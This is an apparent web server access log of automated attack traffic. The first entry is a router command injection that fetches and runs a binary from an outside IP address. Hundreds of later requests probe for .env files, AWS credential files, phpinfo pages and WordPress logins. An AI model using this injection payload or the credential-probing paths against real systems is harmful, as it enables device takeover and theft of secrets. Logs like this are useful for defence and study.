+[0mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) [32m200 [0m1.236 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.749 ms - 6377[0m
+[0mPOST / [32m200 [0m2.004 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.789 ms - 6377[0m
+[0mPOST / [32m200 [0m0.977 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.956 ms - 6377[0m
+[0mPOST / [32m200 [0m0.772 ms - 6377[0m
+[0mGET /.env [32m200 [0m2.360 ms - 6377[0m
+[0mPOST / [32m200 [0m0.828 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.990 ms - 6377[0m
+[0mPOST / [32m200 [0m0.832 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.743 ms - 6377[0m
+[0mPOST / [32m200 [0m0.787 ms - 6377[0m
+[0mGET /druid/index.html [32m200 [0m0.926 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.811 ms - 6377[0m
+[0mPOST / [32m200 [0m0.752 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.747 ms - 6377[0m
+[0mPOST / [32m200 [0m49.639 ms - 6377[0m
+[0mGET /portal/redlion [32m200 [0m0.832 ms - 6377[0m
+[0mPOST /wp-login.php [32m200 [0m0.684 ms - 6377[0m
+[0mPOST /wordpress/wp-login.php [32m200 [0m0.593 ms - 6377[0m
+[0mGET / [32m200 [0m0.766 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.707 ms - 6377[0m
+[0mPOST / [32m200 [0m0.911 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.753 ms - 6377[0m
+[0mPOST / [32m200 [0m0.809 ms - 6377[0m
+[0mGET / [32m200 [0m0.585 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.818 ms - 6377[0m
+[0mPOST / [32m200 [0m558.828 ms - 6377[0m
+[0mGET / [32m200 [0m0.689 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.729 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.762 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.730 ms - 6377[0m
+[0mPOST / [32m200 [0m0.795 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.788 ms - 6377[0m
+[0mPOST / [32m200 [0m0.744 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.842 ms - 6377[0m
+[0mPOST / [32m200 [0m0.743 ms - 6377[0m
+[0mGET / [32m200 [0m0.777 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.116 ms - 6377[0m
+[0mPOST / [32m200 [0m0.760 ms - 6377[0m
+[0mGET / [32m200 [0m0.678 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.842 ms - 6377[0m
+[0mPOST / [32m200 [0m0.726 ms - 6377[0m
+[0mGET / [32m200 [0m0.658 ms - 6377[0m
+[0mPOST /wp-login.php [32m200 [0m0.610 ms - 6377[0m
+[0mPOST /wordpress/wp-login.php [32m200 [0m0.442 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.735 ms - 6377[0m
+[0mPOST / [32m200 [0m1.268 ms - 6377[0m
+[0mGET / [32m200 [0m0.655 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.890 ms - 6377[0m
+[0mGET /geoserver/web/ [32m200 [0m1.664 ms - 6377[0m
+[0mGET / [32m200 [0m0.667 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.791 ms - 6377[0m
+[0mPOST / [32m200 [0m1.385 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.760 ms - 6377[0m
+[0mPOST / [32m200 [0m0.802 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.775 ms - 6377[0m
+[0mPOST / [32m200 [0m0.809 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.877 ms - 6377[0m
+[0mPOST /.env [32m200 [0m22.477 ms - 6377[0m
+[0mGET /.aws/credentials [32m200 [0m0.779 ms - 6377[0m
+[0mPOST /.aws/credentials [32m200 [0m1.480 ms - 6377[0m
+[0mGET /.aws/config [32m200 [0m0.805 ms - 6377[0m
+[0mPOST /.aws/config [32m200 [0m0.888 ms - 6377[0m
+[0mGET /aws/credentials [32m200 [0m0.852 ms - 6377[0m
+[0mPOST /aws/credentials [32m200 [0m22.086 ms - 6377[0m
+[0mGET /test.php [32m200 [0m0.886 ms - 6377[0m
+[0mPOST /test.php [32m200 [0m1.198 ms - 6377[0m
+[0mGET /phpinfo [32m200 [0m0.936 ms - 6377[0m
+[0mPOST /phpinfo [32m200 [0m9.167 ms - 6377[0m
+[0mGET /_profiler/phpinfo [32m200 [0m0.788 ms - 6377[0m
+[0mPOST /_profiler/phpinfo [32m200 [0m14.667 ms - 6377[0m
+[0mGET /phpinfo.php [32m200 [0m0.953 ms - 6377[0m
+[0mPOST /phpinfo.php [32m200 [0m2.533 ms - 6377[0m
+[0mGET /info.php [32m200 [0m1.071 ms - 6377[0m
+[0mPOST /info.php [32m200 [0m16.554 ms - 6377[0m
+[0mGET /phpinfo.php [32m200 [0m0.771 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.665 ms - 6377[0m
+[0mGET /phpinfo [32m200 [0m0.556 ms - 6377[0m
+[0mGET /test.php [32m200 [0m0.564 ms - 6377[0m
+[0mGET /i.php [32m200 [0m0.564 ms - 6377[0m
+[0mGET /php.php [32m200 [0m0.589 ms - 6377[0m
+[0mGET /php_info.php [32m200 [0m0.755 ms - 6377[0m
+[0mGET /phptest.php [32m200 [0m1.243 ms - 6377[0m
+[0mGET /index.php [32m200 [0m0.618 ms - 6377[0m
+[0mGET /dashboard/phpinfo.php [32m200 [0m0.680 ms - 6377[0m
+[0mGET /infophp.php [32m200 [0m0.815 ms - 6377[0m
+[0mGET /p.php [32m200 [0m0.795 ms - 6377[0m
+[0mGET /php-info.php [32m200 [0m0.784 ms - 6377[0m
+[0mGET /testphp.php [32m200 [0m0.741 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.798 ms - 6377[0m
+[0mGET /phpinfo1.php [32m200 [0m0.785 ms - 6377[0m
+[0mGET /test1.php [32m200 [0m1.490 ms - 6377[0m
+[0mGET /info1.php [32m200 [0m0.693 ms - 6377[0m
+[0mGET /phpinfo2.php [32m200 [0m0.661 ms - 6377[0m
+[0mGET /pinfo.php [32m200 [0m0.703 ms - 6377[0m
+[0mGET /scripts/phpinfo.php [32m200 [0m0.778 ms - 6377[0m
+[0mGET /inf.php [32m200 [0m0.792 ms - 6377[0m
+[0mGET /phpinfo.php [32m200 [0m0.786 ms - 6377[0m
+[0mGET /admin/phpinfo.php [32m200 [0m0.769 ms - 6377[0m
+[0mGET /admin/info.php [32m200 [0m1.524 ms - 6377[0m
+[0mGET /test2.php [32m200 [0m0.766 ms - 6377[0m
+[0mGET /index1.php [32m200 [0m1.001 ms - 6377[0m
+[0mGET /forum/info.php [32m200 [0m0.691 ms - 6377[0m
+[0mGET /phpinfo/phpinfo.php [32m200 [0m0.737 ms - 6377[0m
+[0mGET /token.php [32m200 [0m0.964 ms - 6377[0m
+[0mGET /ini.php [32m200 [0m0.710 ms - 6377[0m
+[0mGET /in.php [32m200 [0m0.729 ms - 6377[0m
+[0mGET /phpinfos.php [32m200 [0m0.702 ms - 6377[0m
+[0mGET /scripts/info.php [32m200 [0m0.658 ms - 6377[0m
+[0mGET /test4.php [32m200 [0m0.720 ms - 6377[0m
+[0mGET /foo.php [32m200 [0m0.913 ms - 6377[0m
+[0mGET /php/phpinfo.php [32m200 [0m0.779 ms - 6377[0m
+[0mGET /dev.php [32m200 [0m0.669 ms - 6377[0m
+[0mGET /test3.php [32m200 [0m0.779 ms - 6377[0m
+[0mGET /phpinfo.txt [32m200 [0m0.750 ms - 6377[0m
+[0mGET /info2.php [32m200 [0m0.757 ms - 6377[0m
+[0mGET /forum/phpinfo.php [32m200 [0m1.486 ms - 6377[0m
+[0mGET /administrator/phpinfo.php [32m200 [0m1.061 ms - 6377[0m
+[0mGET /root/phpinfo.php [32m200 [0m0.698 ms - 6377[0m
+[0mGET /root/info.php [32m200 [0m0.736 ms - 6377[0m
+[0mGET /infos.php [32m200 [0m0.785 ms - 6377[0m
+[0mGET /admin/phpinfo [32m200 [0m0.781 ms - 6377[0m
+[0mGET /test1 [32m200 [0m0.771 ms - 6377[0m
+[0mGET /phpinfo.html [32m200 [0m1.054 ms - 6377[0m
+[0mGET /o.php [32m200 [0m1.378 ms - 6377[0m
+[0mGET /administrator/info.php [32m200 [0m0.714 ms - 6377[0m
+[0mGET /apache.php [32m200 [0m0.821 ms - 6377[0m
+[0mGET /dashboard/info.php [32m200 [0m1.197 ms - 6377[0m
+[0mGET /scripts/index.php [32m200 [0m0.806 ms - 6377[0m
+[0mGET /rest.php [32m200 [0m0.747 ms - 6377[0m
+[0mGET /phpinfo/info.php [32m200 [0m0.755 ms - 6377[0m
+[0mGET /infophp/testphp.php [32m200 [0m0.994 ms - 6377[0m
+[0mGET /phpinfo3.php [32m200 [0m0.694 ms - 6377[0m
+[0mGET /php1.php [32m200 [0m1.745 ms - 6377[0m
+[0mGET /dashboard/test.php [32m200 [0m0.745 ms - 6377[0m
+[0mGET /console/phpinfo.php [32m200 [0m0.801 ms - 6377[0m
+[0mGET /info4.php [32m200 [0m0.885 ms - 6377[0m
+[0mGET /infophp/index.php [32m200 [0m0.769 ms - 6377[0m
+[0mGET /console/info.php [32m200 [0m0.813 ms - 6377[0m
+[0mGET /info3.php [32m200 [0m0.821 ms - 6377[0m
+[0mGET /deploy.php [32m200 [0m0.795 ms - 6377[0m
+[0mGET /dashboard/phpinfo [32m200 [0m1.462 ms - 6377[0m
+[0mGET /root/infophp [32m200 [0m0.721 ms - 6377[0m
+[0mGET /scripts/phpinfo [32m200 [0m0.726 ms - 6377[0m
+[0mGET /env/phpinfo [32m200 [0m0.719 ms - 6377[0m
+[0mGET /phpinfo/php-details.php [32m200 [0m0.898 ms - 6377[0m
+[0mGET /php-info [32m200 [0m0.732 ms - 6377[0m
+[0mGET /phpdetails [32m200 [0m0.811 ms - 6377[0m
+[0mGET /php_details [32m200 [0m0.749 ms - 6377[0m
+[0mGET /information.php [32m200 [0m0.759 ms - 6377[0m
+[0mGET /information [32m200 [0m0.803 ms - 6377[0m
+[0mGET /phpinformation [32m200 [0m0.791 ms - 6377[0m
+[0mGET /old_phpinfo.php [32m200 [0m0.786 ms - 6377[0m
+[0mGET /phpversion.php [32m200 [0m0.745 ms - 6377[0m
+[0mGET /admin/infophp.php [32m200 [0m0.733 ms - 6377[0m
+[0mGET /admin/dashboard/info.php [32m200 [0m0.787 ms - 6377[0m
+[0mGET /admin/dashboard/phpinfo [32m200 [0m0.813 ms - 6377[0m
+[0mGET /admin/dashboard/phpinfo.php [32m200 [0m0.891 ms - 6377[0m
+[0mGET /dashboard/admin/info.php [32m200 [0m1.444 ms - 6377[0m
+[0mGET /dashboard/admin/phpinfo [32m200 [0m0.916 ms - 6377[0m
+[0mGET /dashboard/admin/phpinfo.php [32m200 [0m0.965 ms - 6377[0m
+[0mGET /dashboardadmin/phpinfo.php [32m200 [0m0.730 ms - 6377[0m
+[0mGET /dashboardadmin/phpinfo [32m200 [0m0.667 ms - 6377[0m
+[0mGET /dashboardadmin/info.php [32m200 [0m0.856 ms - 6377[0m
+[0mGET /tools/phpinfo.php [32m200 [0m0.912 ms - 6377[0m
+[0mGET /tools/info.php [32m200 [0m0.949 ms - 6377[0m
+[0mGET /tools/phpinfo [32m200 [0m1.053 ms - 6377[0m
+[0mGET /webdav/phpinfo.php [32m200 [0m0.715 ms - 6377[0m
+[0mGET /webdav/phpinfo [32m200 [0m0.782 ms - 6377[0m
+[0mGET /webdav/info.php [32m200 [0m0.798 ms - 6377[0m
+[0mGET /testphpinfo.php [32m200 [0m0.824 ms - 6377[0m
+[0mGET /testphpinfo [32m200 [0m0.732 ms - 6377[0m
+[0mGET /check.php [32m200 [0m1.031 ms - 6377[0m
+[0mGET /pi.php [32m200 [0m0.803 ms - 6377[0m
+[0mGET /local-phpinfo.php [32m200 [0m0.914 ms - 6377[0m
+[0mGET /local-info.php [32m200 [0m1.621 ms - 6377[0m
+[0mGET /admin.php [32m200 [0m0.814 ms - 6377[0m
+[0mGET /_phpinfo.php [32m200 [0m0.720 ms - 6377[0m
+[0mGET /PHPConf.php [32m200 [0m0.640 ms - 6377[0m
+[0mGET /viewinfo.php [32m200 [0m1.046 ms - 6377[0m
+[0mGET /fedora.php [32m200 [0m0.935 ms - 6377[0m
+[0mGET /testing.php [32m200 [0m0.737 ms - 6377[0m
+[0mGET /File/PHP/phpinfo.php [32m200 [0m0.656 ms - 6377[0m
+[0mGET /File/PHP/phpinfo [32m200 [0m1.239 ms - 6377[0m
+[0mGET /File/PHP/info.php [32m200 [0m1.181 ms - 6377[0m
+[0mGET /channel/team/phpinfo.php [32m200 [0m0.805 ms - 6377[0m
+[0mGET /sysinfo/tabs/php-info.php [32m200 [0m0.631 ms - 6377[0m
+[0mGET /~cats/php/info.php [32m200 [0m0.742 ms - 6377[0m
+[0mGET /~cats/php/phpinfo.php [32m200 [0m0.699 ms - 6377[0m
+[0mGET /~cats/php/phpinfo [32m200 [0m0.795 ms - 6377[0m
+[0mGET /info/phpinfo.php [32m200 [0m0.646 ms - 6377[0m
+[0mGET /info/info.php [32m200 [0m0.770 ms - 6377[0m
+[0mGET /info/phpinfo [32m200 [0m0.859 ms - 6377[0m
+[0mGET /php-info/phpinfo.php/php-info/phpinfo [32m200 [0m1.104 ms - 6377[0m
+[0mGET /php-info/info.php [32m200 [0m0.747 ms - 6377[0m
+[0mGET /.env.www [32m200 [0m0.860 ms - 6377[0m
+[0mGET /.env.www [32m200 [0m0.674 ms - 6377[0m
+[0mGET /.env_1 [32m200 [0m0.636 ms - 6377[0m
+[0mGET /.env_sample [32m200 [0m0.626 ms - 6377[0m
+[0mGET /.env.%7B%7BDN%7D%7D [32m200 [0m0.703 ms - 6377[0m
+[0mGET /.env.%7B%7BSD%7D%7D [32m200 [0m11.737 ms - 6377[0m
+[0mGET /.aws/credentials [32m200 [0m0.791 ms - 6377[0m
+[0mGET /_static/.env [32m200 [0m0.729 ms - 6377[0m
+[0mGET /.c9/metadata/environment/.env [32m200 [0m0.705 ms - 6377[0m
+[0mGET /.docker/.env [32m200 [0m0.671 ms - 6377[0m
+[0mGET /.env.backup [32m200 [0m0.659 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.989 ms - 6377[0m
+[0mGET /.env.dev [32m200 [0m0.610 ms - 6377[0m
+[0mGET /.env.example [32m200 [0m0.832 ms - 6377[0m
+[0mGET /.env.local [32m200 [0m0.773 ms - 6377[0m
+[0mGET /.env.php [32m200 [0m0.763 ms - 6377[0m
+[0mGET /.env.prod [32m200 [0m0.691 ms - 6377[0m
+[0mGET /.env.production.local [32m200 [0m0.782 ms - 6377[0m
+[0mGET /.env.save [32m200 [0m0.663 ms - 6377[0m
+[0mGET /.env.stage [32m200 [0m0.629 ms - 6377[0m
+[0mGET /.env.test [32m200 [0m0.713 ms - 6377[0m
+[0mGET /actions-server/.env [32m200 [0m0.744 ms - 6377[0m
+[0mGET /admin-app/.env [32m200 [0m0.702 ms - 6377[0m
+[0mGET /admin/.env [32m200 [0m0.734 ms - 6377[0m
+[0mGET /adminer/.env [32m200 [0m1.114 ms - 6377[0m
+[0mGET /administrator/.env [32m200 [0m0.688 ms - 6377[0m
+[0mGET /agora/.env [32m200 [0m1.009 ms - 6377[0m
+[0mGET /alpha/.env [32m200 [0m0.695 ms - 6377[0m
+[0mGET /anaconda/.env [32m200 [0m0.682 ms - 6377[0m
+[0mGET /api/.env [32m200 [0m3.494 ms - 6377[0m
+[0mGET /api/src/.env [32m200 [0m0.806 ms - 6377[0m
+[0mGET /app_dir/.env [32m200 [0m0.704 ms - 6377[0m
+[0mGET /app/.env [32m200 [0m0.723 ms - 6377[0m
+[0mGET /app/client/.env [32m200 [0m0.702 ms - 6377[0m
+[0mGET /app/config/.env [32m200 [0m0.665 ms - 6377[0m
+[0mGET /app/config/dev/.env [32m200 [0m0.612 ms - 6377[0m
+[0mGET /app/frontend/.env [32m200 [0m0.712 ms - 6377[0m
+[0mGET /apps/.env [32m200 [0m0.631 ms - 6377[0m
+[0mGET /apps/client/.env [32m200 [0m0.693 ms - 6377[0m
+[0mGET /Archipel/.env [32m200 [0m0.766 ms - 6377[0m
+[0mGET /asset_img/.env [32m200 [0m0.889 ms - 6377[0m
+[0mGET /assets/.env [32m200 [0m1.291 ms - 6377[0m
+[0mGET /audio/.env [32m200 [0m0.705 ms - 6377[0m
+[0mGET /awstats/.env [32m200 [0m0.675 ms - 6377[0m
+[0mGET /back/.env [32m200 [0m0.707 ms - 6377[0m
+[0mGET /backend/.env [32m200 [0m0.778 ms - 6377[0m
+[0mGET /backend/src/.env [32m200 [0m0.651 ms - 6377[0m
+[0mGET /backendfinaltest/.env [32m200 [0m0.732 ms - 6377[0m
+[0mGET /backup/.env [32m200 [0m0.825 ms - 6377[0m
+[0mGET /base_dir/.env [32m200 [0m1.845 ms - 6377[0m
+[0mGET /basic-network/.env [32m200 [0m0.681 ms - 6377[0m
+[0mGET /bgoldd/.env [32m200 [0m0.646 ms - 6377[0m
+[0mGET /bitcoind/.env [32m200 [0m0.726 ms - 6377[0m
+[0mGET /blankon/.env [32m200 [0m0.746 ms - 6377[0m
+[0mGET /blob/.env [32m200 [0m0.592 ms - 6377[0m
+[0mGET /blog/.env [32m200 [0m0.646 ms - 6377[0m
+[0mGET /blue/.env [32m200 [0m0.769 ms - 6377[0m
+[0mGET /bookchain-client/.env [32m200 [0m0.708 ms - 6377[0m
+[0mGET /bootstrap/.env [32m200 [0m0.758 ms - 6377[0m
+[0mGET /bucoffea/.env [32m200 [0m0.639 ms - 6377[0m
+[0mGET /build/.env [32m200 [0m0.587 ms - 6377[0m
+[0mGET /cardea/backend/.env [32m200 [0m0.607 ms - 6377[0m
+[0mGET /cdw-backend/.env [32m200 [0m0.569 ms - 6377[0m
+[0mGET /cgi-bin/.env [32m200 [0m1.188 ms - 6377[0m
+[0mGET /challenge/.env [32m200 [0m0.753 ms - 6377[0m
+[0mGET /challenges/.env [32m200 [0m1.146 ms - 6377[0m
+[0mGET /charts/liveObjects/.env [32m200 [0m0.754 ms - 6377[0m
+[0mGET /chat-client/.env [32m200 [0m0.630 ms - 6377[0m
+[0mGET /chiminey/.env [32m200 [0m0.636 ms - 6377[0m
+[0mGET /client-app/.env [32m200 [0m0.558 ms - 6377[0m
+[0mGET /client/.env [32m200 [0m0.668 ms - 6377[0m
+[0mGET /client/src/.env [32m200 [0m0.697 ms - 6377[0m
+[0mGET /ClientApp/.env [32m200 [0m1.132 ms - 6377[0m
+[0mGET /clld_dir/.env [32m200 [0m0.699 ms - 6377[0m
+[0mGET /collected_static/.env [32m200 [0m0.632 ms - 6377[0m
+[0mGET /community/.env [32m200 [0m0.768 ms - 6377[0m
+[0mGET /conf/.env [32m200 [0m0.622 ms - 6377[0m
+[0mGET /config/.env [32m200 [0m0.705 ms - 6377[0m
+[0mGET /ContainerRegistry/.env [32m200 [0m5.337 ms - 6377[0m
+[0mGET /content/.env [32m200 [0m0.666 ms - 6377[0m
+[0mGET /core/.env [32m200 [0m0.656 ms - 6377[0m
+[0mGET /core/app/.env [32m200 [0m0.680 ms - 6377[0m
+[0mGET /core/Datavase/.env [32m200 [0m1.310 ms - 6377[0m
+[0mGET /core/persistence/.env [32m200 [0m0.689 ms - 6377[0m
+[0mGET /counterblockd/.env [32m200 [0m0.658 ms - 6377[0m
+[0mGET /counterwallet/.env [32m200 [0m0.818 ms - 6377[0m
+[0mGET /cp/.env [32m200 [0m0.604 ms - 6377[0m
+[0mGET /cron/.env [32m200 [0m0.598 ms - 6377[0m
+[0mGET /cronlab/.env [32m200 [0m0.589 ms - 6377[0m
+[0mGET /cryo_project/.env [32m200 [0m0.680 ms - 6377[0m
+[0mGET /css/.env [32m200 [0m1.496 ms - 6377[0m
+[0mGET /custom/.env [32m200 [0m0.657 ms - 6377[0m
+[0mGET /d/.env [32m200 [0m0.724 ms - 6377[0m
+[0mGET /data/.env [32m200 [0m0.774 ms - 6377[0m
+[0mGET /database/.env [32m200 [0m0.775 ms - 6377[0m
+[0mGET /dataset/.env [32m200 [0m0.640 ms - 6377[0m
+[0mGET /default/.env [32m200 [0m0.690 ms - 6377[0m
+[0mGET /delivery/.env [32m200 [0m0.765 ms - 6377[0m
+[0mGET /demo-app/.env [32m200 [0m0.615 ms - 6377[0m
+[0mGET /demo/.env [32m200 [0m0.708 ms - 6377[0m
+[0mGET /deploy/.env [32m200 [0m0.719 ms - 6377[0m
+[0mGET /developerslv/.env [32m200 [0m0.712 ms - 6377[0m
+[0mGET /development/.env [32m200 [0m0.717 ms - 6377[0m
+[0mGET /directories/.env [32m200 [0m0.667 ms - 6377[0m
+[0mGET /doc/.env [32m200 [0m0.706 ms - 6377[0m
+[0mGET /docker/.env [32m200 [0m0.669 ms - 6377[0m
+[0mGET /docs/.env [32m200 [0m0.722 ms - 6377[0m
+[0mGET /dodoswap-client/.env [32m200 [0m0.818 ms - 6377[0m
+[0mGET /dotfiles/.env [32m200 [0m0.726 ms - 6377[0m
+[0mGET /download/.env [32m200 [0m0.686 ms - 6377[0m
+[0mGET /downloads/.env [32m200 [0m1.201 ms - 6377[0m
+[0mGET /e2e/.env [32m200 [0m0.565 ms - 6377[0m
+[0mGET /en/.env [32m200 [0m0.611 ms - 6377[0m
+[0mGET /engine/.env [32m200 [0m0.725 ms - 6377[0m
+[0mGET /env/.env [32m200 [0m0.771 ms - 6377[0m
+[0mGET /example/.env [32m200 [0m1.917 ms - 6377[0m
+[0mGET /export/.env [32m200 [0m0.677 ms - 6377[0m
+[0mGET /fastlane/.env [32m200 [0m0.627 ms - 6377[0m
+[0mGET /favicons/.env [32m200 [0m0.576 ms - 6377[0m
+[0mGET /favs/.env [32m200 [0m0.931 ms - 6377[0m
+[0mGET /fedex/.env [32m200 [0m0.874 ms - 6377[0m
+[0mGET /fhir-api/.env [32m200 [0m0.696 ms - 6377[0m
+[0mGET /files/.env [32m200 [0m1.359 ms - 6377[0m
+[0mGET /fileserver/.env [32m200 [0m1.213 ms - 6377[0m
+[0mGET /films/.env [32m200 [0m1.230 ms - 6377[0m
+[0mGET /fm/.env [32m200 [0m0.718 ms - 6377[0m
+[0mGET /font-icons/.env [32m200 [0m0.673 ms - 6377[0m
+[0mGET /fonts/.env [32m200 [0m0.799 ms - 6377[0m
+[0mGET /frontend/.env [32m200 [0m0.749 ms - 6377[0m
+[0mGET /frontendfinaltest/.env [32m200 [0m0.668 ms - 6377[0m
+[0mGET /ftp/.env [32m200 [0m0.728 ms - 6377[0m
+[0mGET /ftpmaster/.env [32m200 [0m0.683 ms - 6377[0m
+[0mGET /grems-api/.env [32m200 [0m0.663 ms - 6377[0m
+[0mGET /grems-frontend/.env [32m200 [0m0.708 ms - 6377[0m
+[0mGET /Hash/.env [32m200 [0m0.638 ms - 6377[0m
+[0mGET /hasura/.env [32m200 [0m0.717 ms - 6377[0m
+[0mGET /Helmetjs/.env [32m200 [0m0.785 ms - 6377[0m
+[0mGET /hgs-static/.env [32m200 [0m0.736 ms - 6377[0m
+[0mGET /higlass-website/.env [32m200 [0m0.938 ms - 6377[0m
+[0mGET /home/.env [32m200 [0m0.706 ms - 6377[0m
+[0mGET /horde/.env [32m200 [0m1.342 ms - 6377[0m
+[0mGET /hotpot-app-frontend/.env [32m200 [0m0.747 ms - 6377[0m
+[0mGET /htdocs/.env [32m200 [0m0.737 ms - 6377[0m
+[0mGET /html/.env [32m200 [0m0.804 ms - 6377[0m
+[0mGET /http/.env [32m200 [0m0.704 ms - 6377[0m
+[0mGET /httpboot/.env [32m200 [0m0.814 ms - 6377[0m
+[0mGET /icon/.env [32m200 [0m0.857 ms - 6377[0m
+[0mGET /icons/.env [32m200 [0m0.764 ms - 6377[0m
+[0mGET /ikiwiki/.env [32m200 [0m0.758 ms - 6377[0m
+[0mGET /image_data/.env [32m200 [0m0.771 ms - 6377[0m
+[0mGET /Imagebord/.env [32m200 [0m0.653 ms - 6377[0m
+[0mGET /images/.env [32m200 [0m0.649 ms - 6377[0m
+[0mGET /img/.env [32m200 [0m0.715 ms - 6377[0m
+[0mGET /install/.env [32m200 [0m0.710 ms - 6377[0m
+[0mGET /items/.env [32m200 [0m0.829 ms - 6377[0m
+[0mGET /javascript/.env [32m200 [0m0.834 ms - 6377[0m
+[0mGET /js-plugin/.env [32m200 [0m0.682 ms - 6377[0m
+[0mGET /js/.env [32m200 [0m1.449 ms - 6377[0m
+[0mGET /jsrelay/.env [32m200 [0m0.575 ms - 6377[0m
+[0mGET /jupyter/.env [32m200 [0m0.647 ms - 6377[0m
+[0mGET /khanlinks/.env [32m200 [0m0.542 ms - 6377[0m
+[0mGET /kibana/.env [32m200 [0m0.793 ms - 6377[0m
+[0mGET /kodenames-server/.env [32m200 [0m0.696 ms - 6377[0m
+[0mGET /kolab-syncroton/.env [32m200 [0m1.222 ms - 6377[0m
+[0mGET /Kubernetes/.env [32m200 [0m0.796 ms - 6377[0m
+[0mGET /lab/.env [32m200 [0m0.778 ms - 6377[0m
+[0mGET /laravel/.env [32m200 [0m0.804 ms - 6377[0m
+[0mGET /latest/.env [32m200 [0m0.783 ms - 6377[0m
+[0mGET /layout/.env [32m200 [0m0.690 ms - 6377[0m
+[0mGET /leafer-app/.env [32m200 [0m0.619 ms - 6377[0m
+[0mGET /ledger_sync/.env [32m200 [0m0.898 ms - 6377[0m
+[0mGET /lemonldap-ng-doc/.env [32m200 [0m0.731 ms - 6377[0m
+[0mGET /lemonldap-ng-fr-doc/.env [32m200 [0m0.600 ms - 6377[0m
+[0mGET /letsencrypt/.env [32m200 [0m0.977 ms - 6377[0m
+[0mGET /lib/.env [32m200 [0m0.767 ms - 6377[0m
+[0mGET /Library/.env [32m200 [0m0.878 ms - 6377[0m
+[0mGET /libs/.env [32m200 [0m0.661 ms - 6377[0m
+[0mGET /linux/.env [32m200 [0m0.665 ms - 6377[0m
+[0mGET /local/.env [32m200 [0m0.774 ms - 6377[0m
+[0mGET /log/.env [32m200 [0m0.678 ms - 6377[0m
+[0mGET /logging/.env [32m200 [0m0.714 ms - 6377[0m
+[0mGET /login/.env [32m200 [0m1.427 ms - 6377[0m
+[0mGET /mail/.env [32m200 [0m0.717 ms - 6377[0m
+[0mGET /mailinabox/.env [32m200 [0m0.709 ms - 6377[0m
+[0mGET /mailman/.env [32m200 [0m0.731 ms - 6377[0m
+[0mGET /main_user/.env [32m200 [0m0.716 ms - 6377[0m
+[0mGET /main/.env [32m200 [0m0.744 ms - 6377[0m
+[0mGET /manual/.env [32m200 [0m0.696 ms - 6377[0m
+[0mGET /master/.env [32m200 [0m0.721 ms - 6377[0m
+[0mGET /media/.env [32m200 [0m1.125 ms - 6377[0m
+[0mGET /memcached/.env [32m200 [0m0.655 ms - 6377[0m
+[0mGET /micro-app-react/.env [32m200 [0m0.745 ms - 6377[0m
+[0mGET /minified/.env [32m200 [0m0.694 ms - 6377[0m
+[0mGET /misc/.env [32m200 [0m0.649 ms - 6377[0m
+[0mGET /Modix/ClientApp/.env [32m200 [0m0.588 ms - 6377[0m
+[0mGET /monerod/.env [32m200 [0m0.576 ms - 6377[0m
+[0mGET /moodledata/.env [32m200 [0m0.585 ms - 6377[0m
+[0mGET /msks/.env [32m200 [0m0.615 ms - 6377[0m
+[0mGET /munki_repo/.env [32m200 [0m0.667 ms - 6377[0m
+[0mGET /music/.env [32m200 [0m0.628 ms - 6377[0m
+[0mGET /name/.env [32m200 [0m0.705 ms - 6377[0m
+[0mGET /new-js/.env [32m200 [0m0.724 ms - 6377[0m
+[0mGET /news-app/.env [32m200 [0m0.656 ms - 6377[0m
+[0mGET /nginx-server/.env [32m200 [0m0.715 ms - 6377[0m
+[0mGET /nginx/.env [32m200 [0m0.774 ms - 6377[0m
+[0mGET /niffler-frontend/.env [32m200 [0m0.704 ms - 6377[0m
+[0mGET /node_modules/.env [32m200 [0m1.236 ms - 6377[0m
+[0mGET /noVNC/.env [32m200 [0m0.687 ms - 6377[0m
+[0mGET /oldsanta/.env [32m200 [0m0.639 ms - 6377[0m
+[0mGET /ops/vagrant/.env [32m200 [0m0.789 ms - 6377[0m
+[0mGET /option/.env [32m200 [0m0.613 ms - 6377[0m
+[0mGET /orientdb-client/.env [32m200 [0m0.750 ms - 6377[0m
+[0mGET /outputs/.env [32m200 [0m0.748 ms - 6377[0m
+[0mGET /owncloud/.env [32m200 [0m0.604 ms - 6377[0m
+[0mGET /packed/.env [32m200 [0m0.634 ms - 6377[0m
+[0mGET /page-editor/.env [32m200 [0m0.715 ms - 6377[0m
+[0mGET /parity/.env [32m200 [0m0.662 ms - 6377[0m
+[0mGET /Passportjs/.env [32m200 [0m0.828 ms - 6377[0m
+[0mGET /patchwork/.env [32m200 [0m0.692 ms - 6377[0m
+[0mGET /path/.env [32m200 [0m0.640 ms - 6377[0m
+[0mGET /pfbe/.env [32m200 [0m0.739 ms - 6377[0m
+[0mGET /pictures/.env [32m200 [0m0.588 ms - 6377[0m
+[0mGET /playground/.env [32m200 [0m0.736 ms - 6377[0m
+[0mGET /plugin_static/.env [32m200 [0m1.326 ms - 6377[0m
+[0mGET /postfixadmin/.env [32m200 [0m0.644 ms - 6377[0m
+[0mGET /price_hawk_client/.env [32m200 [0m0.671 ms - 6377[0m
+[0mGET /prisma/.env [32m200 [0m0.664 ms - 6377[0m
+[0mGET /private/.env [32m200 [0m0.594 ms - 6377[0m
